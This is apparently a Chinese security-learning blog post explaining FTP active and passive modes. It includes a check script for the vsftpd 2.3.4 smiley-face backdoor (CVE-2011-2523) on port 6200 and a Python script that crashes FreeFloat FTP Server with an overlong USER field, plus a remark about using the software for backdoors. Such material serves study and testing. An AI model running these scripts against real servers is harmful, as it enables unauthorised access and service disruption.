@@ -1,0 +1,159 @@
+节日在家无聊看完了kali linux2这本书，对书中一些知识比较感兴趣，于是才有了这篇文章。  
+
+## 协议介绍
+
+FTP（File Transfer Protocol）文件传输协议，在TCP/IP协议族中属于 **应用层协议**
+运行于TCP协议之上是一种可靠的传输协议，主要功能用于实现用户间文件分发共享，以及网络管理者在进行设备版本升级、日志下载和配置保存等业务操作时，均会使用到FTP功能。ftp协议是采用C/S结构。也就是客户端服务端
+
+## FTP两个TCP链接
+
+控制连接（TCP 21端口）主要用于实现FTP协议控制信令传送，服务器端打开TCP
+21端口被动等待客户端发起连接命令；客户端则以主动方式打开随机端口，发起连接的建立请求。
+
+数据连接（TCP 20端口）主要用于实现应用数据传送，服务器的数据连接端使用端口20。服务器执行主动打开数据连接，通常也执行主动关闭数据连接 。
+
+也就是说我们是通过21端口进行连接ftp服务（默认端口）
+
+## FTP连接建立方式
+
+### 主动方式
+
+主动方式也称为PORT方式，是FTP协议最初定义的数据传输连接方式，主要流程是:
+
+> 1.FTP客户端通过向FTP服务器发送PORT命令，告诉服务器该客户端用于传输数据的临时端口号
+>
+> 2.当需要传送数据时，服务器通过TCP端口号20与客户端的临时端口建立数据传输通道，完成数据传输。
+
+在建立数据连接的过程中，由服务器主动发起连接，因此被称为主动方式。
+
+### 被动方式
+
+被动方式也称为PASV方式，被动方式的主要流程是:
+
+> 1.FTP客户端通过向FTP服务器发送PASV命令，告诉服务器进入被动方式。
+>
+> 2.服务器选择临时端口号并告知客户端当需要传送数据时，客户端主动与服务器的临时端口号建立数据传输通道，完成数据传输。
+
+在整个过程中，由于服务器总是被动接收客户端的数据连接，因此被称为被动方式。
+
+为了更加清晰的分析，我们这里使用[FreeFloat FTP Server](https://www.exploit-db.com/apps/687ef6f72dcbbf5b2506e80a375377fa-freefloatftpserver.zip)工具(原因是下面漏洞复会使用)
+
+客户端的43894端口与服务器的21端口进行三次握手，确认连接
+
+![1620914918_609d32e68ea5b45166678.png!small?1620914920377](https://image.3001.net/images/20210513/1620914918_609d32e68ea5b45166678.png!small?1620914920377)
+
+链接之后，服务器会返回ftp的版本号。220代表服务就绪可用户进行登录。
+
+![1620914925_609d32ed62a244e0a1c59.png!small?1620914927243](https://image.3001.net/images/20210513/1620914925_609d32ed62a244e0a1c59.png!small?1620914927243)
+
+然后输入用户名和密码，这里我输入的都是空(默认用户名是root)，不管用户名是否正确，都会返回331
+
+Please specify the password。此时如果密码正确返回230 Login successful，如果错误则返回530 Login
+incorrect。
+
+然后输入`ls`命令，但客户端实际发送给服务器的是两条命令PORT和LIST，PORT表示主动模式，所以这里客户端会告诉服务器要与自己的哪个端口进行连接，LIST命令查询文件列表信息。
+
+![1620914934_609d32f60ef34340f4efe.png!small?1620914936005](https://image.3001.net/images/20210513/1620914934_609d32f60ef34340f4efe.png!small?1620914936005)
+
+命令PORT格式：PORT 1,2,3,4,5,6 => 1、2、3、4用来表示通信的IP地址，5和6表示的是端口地址，公式为：实际端口 =
+(5数值*256 + 6数值)
+
+在服务器获得客户端的IP地址和目标端口后，会使用20端口与目标端口进行TCP的三次握手连接。接着客户端向服务器的21端口发送ftp命令LIST；服务器收到报文后，使用20端口发送响应数据给客户端；完成一次数据通信。
+
+下面是数据的通信内容，也就是我们执行命令的内容
+
+![1620914945_609d3301db4554e898fc1.png!small?1620914947869](https://image.3001.net/images/20210513/1620914945_609d3301db4554e898fc1.png!small?1620914947869)
+
+ **注意是数据通信的过程也是明文传输**
+
+上传/下载的流程也是和上述相同，上传 => STOP、下载 => RETR
+
+传输成功后有返回150 Opening BINARY mode data connection for 文件名(文件大小)
+
+传输失败则是 550 Permission denied
+
+上面是介绍了主动模式，被动模式原理一样
+
+## 笑脸漏洞-CVE-2011-2523
+
+笑脸漏洞漏洞的产生是软件vsftpd-2.3.4，也就是verysecureFTPdaemon的缩写，是一款FTP服务器，在代码中存在一个重大的问题，在文件srt.c中出现一段与程序无关的代码。
+
+    
+    
+    {  
+    return 1;  
+    }  
+    else if((p_str->p_buf[i]==0x3a)&&(p_str->p_buf[i+1]==0x29))  
+    {  
+    vsf_sysutil_extra();  
+    }  
+    return 0;  
+    }
+
+这样一段代码是c语言实现的选择结构的代码，功能是如果数组p_buf第i个元素是0x3a,第i+1个元素的0x29，就会执行vsf_sysutil_extra()函数，而vsf_sysutil_extra其实功拿是一个建立socket连接的端口是6200。而我们如何去触发这个连接后门？在vsftpd-2.3.4的设计中服务端会接收客户端发过来的用户名和密码，而用户名就存放在p_buf的数组中，所以我们只要在登录的时候输入0x3a0x29就会去触发这个socket连接后门。
+
+之所以说笑脸漏洞，是因为0x3a0x29的字符是 **：）**
+
+ **检查脚本**
+
+    
+    
+    import socket  
+    from ftplib import FTP  
+    ​  
+    host_ip = input("检查的ip:")  
+    ftp=FTP()  
+    backdoorstr = "Hello:)"  
+    backdoorpass = "me"  
+    ​  
+    try:  
+    ftp.connect(host_ip,21,timeout=2)  
+    ftp.login(backdoorstr,backdoorpass)  
+    except:  
+    print("完成检查")  
+    try:  
+    s = socket.socket()  
+    nock = s.connect(host_ip,6200)  
+    print("存在笑脸漏洞")  
+    except:  
+    print("不存在漏洞")
+
+在nmap中也有相应的脚本进行测试。
+
+![1620914956_609d330c4149517d08f53.png!small?1620914958102](https://image.3001.net/images/20210513/1620914956_609d330c4149517d08f53.png!small?1620914958102)
+
+## FreeFloat FTP Server溢出漏洞
+
+FreeFloat FTP Server是一个非常简单的FTP服务器的软件，而这个软件存在一个登录溢出漏洞。我们可以使用python脚本来验证登录的时候。
+
+    
+    
+    import socket  
+    shellcode=b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"  
+    s = socket.socket()  
+    s.connect(('192.168.96.138',21))  
+    data = b"USER "+shellcode+b"\r\n"#这里的格式前面的数据包里面有  
+    s.send(data)  
+    s.close()
+
+然后就会出现崩溃的页面,然后就可以利用pwn知识进行漏洞利用（web手不会2333）
+
+![1620914965_609d331559f47b662d923.png!small?1620914967228](https://image.3001.net/images/20210513/1620914965_609d331559f47b662d923.png!small?1620914967228)
+
+然后可以添加shellcode进行利用，不过需要分析出偏移地址。这里就不分析了因为不会。虽然这个漏洞已经非常old了，但是需要了解嘛，知识面宽一下。直接给出exploit-db中的[exp](https://www.exploit-db.com/exploits/23243)（抱着学习的态度）
+
+严格的说该漏洞不是ftp协议的问题，而是软件溢出的问题。
+
+扩展一下，在制作后门的时候可以使用该软件，不过需要注意目标版本问题。利用方法师傅们可以天马行空的想。
+
+## 总结一下下
+
+上面内容主要是自己对kali
+linux2这本书中感兴趣的部分进行更加深入学习（内容比较简单主要是对ftp协议去学习），其实还有一部分就是社会工程学，制作病毒U盘等等。
+
+## 参考
+
+<https://zhuanlan.zhihu.com/p/34109504>
+
+atao师傅分享的文章
+
